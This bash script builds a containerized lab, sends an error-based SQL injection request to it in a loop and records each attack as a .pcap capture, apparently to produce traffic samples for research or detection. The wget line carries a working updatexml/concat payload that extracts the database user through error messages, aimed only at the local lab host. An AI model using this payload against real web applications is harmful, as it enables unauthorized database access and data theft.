#! /bin/bash

read -p "Enter number of .pcap files: " PACK_NUMBER

for ((i = 1; i <= PACK_NUMBER; i++))
do 
    password=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12)
    sed -i "/password/c\    'password'       => '$password'," www/database.php
    sed -i "/MYSQL_ROOT_PASSWORD/c\    - MYSQL_ROOT_PASSWORD=$password" docker-compose.yml
    docker-compose up -d
    sleep 5
    tcpdump -U -i br_sqli_int -w ${i}.pcap & 
    sleep 1
    docker run --net sqli_net  --rm mwendler/wget --content-on-error 'http://172.20.0.3:80/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
    sleep 4
    pid=$(ps -e | pgrep tcpdump)
    kill -2 $pid
    docker-compose down
done
